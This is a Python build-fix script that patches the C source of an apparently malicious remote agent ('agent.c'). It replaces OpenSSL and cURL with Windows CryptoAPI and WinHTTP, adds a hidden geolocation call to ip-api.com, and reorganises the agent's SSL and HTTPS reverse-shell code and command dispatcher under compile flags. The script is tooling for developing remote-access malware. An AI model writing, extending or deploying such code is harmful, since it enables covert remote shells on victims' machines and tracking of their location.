#!/usr/bin/env python3
"""Fix leftover cURL/OpenSSL references in agent.c"""

AGENT_PATH = "agent.c"

with open(AGENT_PATH, 'r', encoding='utf-8', errors='replace') as f:
    content = f.read()

# Normalize to \n for processing
content = content.replace('\r\n', '\n')

# ======================================================================
# FIX 1: Replace EVP SHA-256 with Windows CryptoAPI
# ======================================================================
old_evp = """    // Calculate SHA-256
    unsigned char hash[EVP_MAX_MD_SIZE];
    unsigned int hash_len;
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(mdctx, EVP_sha256(), NULL);
    if (size > 0)
      EVP_DigestUpdate(mdctx, buf, to_read);
    EVP_DigestFinal_ex(mdctx, hash, &hash_len);
    EVP_MD_CTX_free(mdctx);"""

new_sha256 = """    // Calculate SHA-256 using Windows CryptoAPI (no OpenSSL needed)
    unsigned char hash[32]; // SHA-256 is always 32 bytes
    unsigned int hash_len = 32;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    if (size > 0)
      CryptHashData(hHash, buf, to_read, 0);
    DWORD cbHash = 32;
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &cbHash, 0);
    hash_len = cbHash;
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);"""

if old_evp in content:
    content = content.replace(old_evp, new_sha256)
    print("FIX 1: Replaced EVP SHA-256 with CryptoAPI OK")
else:
    print("FIX 1: EVP block not found (maybe already fixed)")

# ======================================================================
# FIX 2: Replace cmd_location() cURL code with WinHTTP
# ======================================================================
loc_start = content.find('// Location (ip-api.com)\nchar *cmd_location() {')

if loc_start >= 0:
    # Find the closing brace of the function
    brace_count = 0
    func_body_start = content.find('{', loc_start)
    i = func_body_start
    while i < len(content):
        if content[i] == '{':
            brace_count += 1
        elif content[i] == '}':
            brace_count -= 1
            if brace_count == 0:
                loc_end = i + 1
                break
        i += 1

    new_location = '''// Location (ip-api.com) - uses WinHTTP (no libcurl needed)
char *cmd_location() {
#ifdef _WIN32
  HINTERNET hSes = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSes) goto loc_fail;
  HINTERNET hCon = WinHttpConnect(hSes, L"ip-api.com", INTERNET_DEFAULT_HTTP_PORT, 0);
  if (!hCon) { WinHttpCloseHandle(hSes); goto loc_fail; }
  HINTERNET hReq = WinHttpOpenRequest(hCon, L"GET", L"/json/", NULL,
                                       WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
  if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes); goto loc_fail; }
  WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
  WinHttpReceiveResponse(hReq, NULL);
  char loc_buf[4096] = {0};
  DWORD loc_read = 0, loc_total = 0;
  while (WinHttpReadData(hReq, loc_buf + loc_total, sizeof(loc_buf) - loc_total - 1, &loc_read) && loc_read > 0)
    loc_total += loc_read;
  WinHttpCloseHandle(hReq); WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSes);
  struct json_object *data = json_tokener_parse(loc_buf);
  if (!data) data = json_object_new_object();
  char *res_str = make_result("location", data);
  json_object_put(data);
  return res_str;
loc_fail:
#endif
  {
    struct json_object *data = json_object_new_object();
    char *res_str = make_result("location", data);
    json_object_put(data);
    return res_str;
  }
}'''
    content = content[:loc_start] + new_location + content[loc_end:]
    print("FIX 2: Replaced cmd_location with WinHTTP OK")
else:
    print("FIX 2: cmd_location not found")

# ======================================================================
# FIX 3: Wrap SSL rev shell code in #ifdef USE_OPENSSL
# ======================================================================
# 3a: Wrap the _rs_ssl global
if 'static SSL *_rs_ssl = NULL;' in content:
    content = content.replace(
        'static SSL *_rs_ssl = NULL;',
        '#ifdef USE_OPENSSL\nstatic SSL *_rs_ssl = NULL;\n#else\nstatic void *_rs_ssl = NULL;\n#endif'
    )
    print("FIX 3a: Wrapped _rs_ssl global OK")

# 3b: Wrap the SSL proxy context and threads
old_ctx = "// Context for the two ConPTY proxy threads\ntypedef struct {\n  SSL *ssl;"
if old_ctx in content:
    content = content.replace(old_ctx,
        "#ifdef USE_OPENSSL\n// Context for the two ConPTY proxy threads\ntypedef struct {\n  SSL *ssl;")
    print("FIX 3b: Wrapped SSL proxy context start OK")

# 3c: Find where _shell_to_tcp ends and insert #endif
old_cleanup = """  // Cleanup
  SSL_free(ctx->ssl);
  closesocket(ctx->sock);
  CloseHandle(ctx->pipe_read);
  free(ctx);
  return 0;
}"""
idx = content.find(old_cleanup)
if idx >= 0:
    end_idx = idx + len(old_cleanup)
    content = content[:end_idx] + '\n#endif // USE_OPENSSL\n' + content[end_idx:]
    print("FIX 3c: Added #endif after SSL proxy functions OK")

# 3d: Wrap SSL cleanup in cmd_revshell_stop
old_ssl_cleanup = """  if (_rs_ssl) {
    SSL_shutdown(_rs_ssl);
    SSL_free(_rs_ssl);
    _rs_ssl = NULL;
  }"""
new_ssl_cleanup = """#ifdef USE_OPENSSL
  if (_rs_ssl) {
    SSL_shutdown(_rs_ssl);
    SSL_free(_rs_ssl);
    _rs_ssl = NULL;
  }
#endif"""
if old_ssl_cleanup in content:
    content = content.replace(old_ssl_cleanup, new_ssl_cleanup)
    print("FIX 3d: Wrapped SSL cleanup in cmd_revshell_stop OK")

# ======================================================================
# FIX 4: Wrap entire HTTPS rev shell (cURL) section in #ifdef USE_CURL
# ======================================================================
# The section starts with a === comment block before "Reverse Shell"
# and includes typedef, thread funcs, and cmd_revshell_https

# Find the === block that starts the HTTPS rev shell section
marker = "// Reverse Shell "  # note the em-dash might be tricky
https_markers = [
    "// Reverse Shell \u2013 HTTPS polling transport",
    "// Reverse Shell -- HTTPS polling transport",
]

https_rs_start = -1
for m in https_markers:
    idx = content.find(m)
    if idx >= 0:
        https_rs_start = idx
        break

if https_rs_start < 0:
    # Try a broader search
    idx = content.find("HTTPS polling transport")
    if idx >= 0:
        https_rs_start = content.rfind("\n", 0, idx) + 1

if https_rs_start >= 0:
    # Go back to the ===== line before it
    eq_line = content.rfind("// =====", 0, https_rs_start)
    if eq_line >= 0:
        # Go back to the start of that line
        line_start = content.rfind("\n", 0, eq_line)
        https_rs_start = line_start + 1 if line_start >= 0 else eq_line

    # Find cmd_revshell_https function and its end
    func_start = content.find('char *cmd_revshell_https(', https_rs_start)
    if func_start >= 0:
        brace_count = 0
        i = content.find('{', func_start)
        while i < len(content):
            if content[i] == '{':
                brace_count += 1
            elif content[i] == '}':
                brace_count -= 1
                if brace_count == 0:
                    func_end = i + 1
                    break
            i += 1

        # Find the #endif after this function (closes #ifdef _WIN32)
        endif_pos = content.find('\n#endif', func_end)
        if endif_pos >= 0:
            block_end = content.find('\n', endif_pos + 1)
            if block_end < 0:
                block_end = endif_pos + 7

            block = content[https_rs_start:block_end]
            content = (content[:https_rs_start] +
                      '#ifdef USE_CURL\n' + block + '\n#endif // USE_CURL\n' +
                      content[block_end:])
            print("FIX 4: Wrapped HTTPS rev shell in #ifdef USE_CURL OK")
        else:
            print("FIX 4: Could not find #endif after cmd_revshell_https")
    else:
        print("FIX 4: cmd_revshell_https function not found")
else:
    print("FIX 4: HTTPS rev shell section not found")

# ======================================================================
# FIX 5: Remove any leftover curl_string struct and write_callback
# ======================================================================
if 'struct curl_string {' in content:
    cs_start = content.find('struct curl_string {')
    if cs_start >= 0:
        cs_end = content.find('};', cs_start) + 2
        content = content[:cs_start] + content[cs_end:]
        print("FIX 5a: Removed curl_string struct OK")

if 'static size_t write_callback(' in content:
    wc_start = content.find('static size_t write_callback(')
    if wc_start >= 0:
        brace_count = 0
        i = content.find('{', wc_start)
        while i < len(content):
            if content[i] == '{':
                brace_count += 1
            elif content[i] == '}':
                brace_count -= 1
                if brace_count == 0:
                    wc_end = i + 1
                    content = content[:wc_start] + content[wc_end:]
                    print("FIX 5b: Removed write_callback OK")
                    break
            i += 1

# ======================================================================
# FIX 6: Wrap dispatcher call to cmd_revshell_https in #ifdef USE_CURL
# ======================================================================
dispatch_idx = content.find('"revshell_https"')
if dispatch_idx >= 0:
    # Find the line start
    line_start = content.rfind('\n', 0, dispatch_idx) + 1
    # Find the matching } for the block
    block_brace = content.find('{', dispatch_idx)
    if block_brace >= 0:
        brace_count = 0
        i = block_brace
        while i < len(content):
            if content[i] == '{':
                brace_count += 1
            elif content[i] == '}':
                brace_count -= 1
                if brace_count == 0:
                    block_end = i + 1
                    block = content[line_start:block_end]
                    content = content[:line_start] + '#ifdef USE_CURL\n' + block + '\n#endif // USE_CURL\n' + content[block_end:]
                    print("FIX 6: Wrapped revshell_https dispatcher OK")
                    break
            i += 1

# ======================================================================
# Convert back to CRLF and save
# ======================================================================
content = content.replace('\n', '\r\n')
content = content.replace('\r\r\n', '\r\n')  # clean up any doubles

with open(AGENT_PATH, 'wb') as f:
    f.write(content.encode('utf-8'))

print("\nAll fixes applied. File saved.")
